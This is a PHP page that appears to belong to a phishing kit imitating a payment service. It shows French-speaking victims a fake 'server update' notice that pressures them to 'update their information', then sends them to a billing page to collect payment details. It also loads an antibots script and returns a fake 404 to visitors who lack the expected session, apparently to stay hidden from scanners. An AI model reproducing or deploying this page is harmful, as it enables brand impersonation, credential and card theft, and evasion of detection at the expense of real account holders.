<?php
ob_start();
session_start();
if(isset($_SESSION['step_one'])){
$_SESSION['step_two']  = true;
include'../antibots.php';
date_default_timezone_set('GMT');
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Sécurité</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd">Que se passe t-il ?</p>
                   <div class="contain-lists">
                       <center>
                            <img src="../img/shield.png" />
                            <h4>Mise à jour de nos serveurs</h4>
                       </center>
                       <b class="bold">
                           <h5>Une mise à jour de nos serveurs a été effectuée afin de vous garantir un meilleur service et une meilleur sécurité.</h5>
               <h5>
<TD align=left>
<br>

<P>Pour terminer le processus de celle-ci, vous devez impérativement mettre à jour vos informations sur votre compte.</P>
<br>
<P>Après cela, vous pourrez continuer vos achats en ligne et envoyer de l'argent.</P> <br>
<P><STRONG>Voici les étapes à suivre à la date du <?php echo date("d/m/Y")?>:</STRONG></P>
<p>1.Cliquez sur <b>continuer<b> pour commencer</p>
<p>2.Mettez à jour vos informations</p>
<p>3.Retrouvez l'accès complet à votre compte</p>
                       <center>
                           <a href="<?php echo 'billing.php?enc='.md5(time()).'&p=1&dispatch='.sha1(time()); ?>" class="proccess">Continuer</a>
                       </center>

                </div>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
}
else {
    header("HTTP/1.0 404 Not Found");
  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>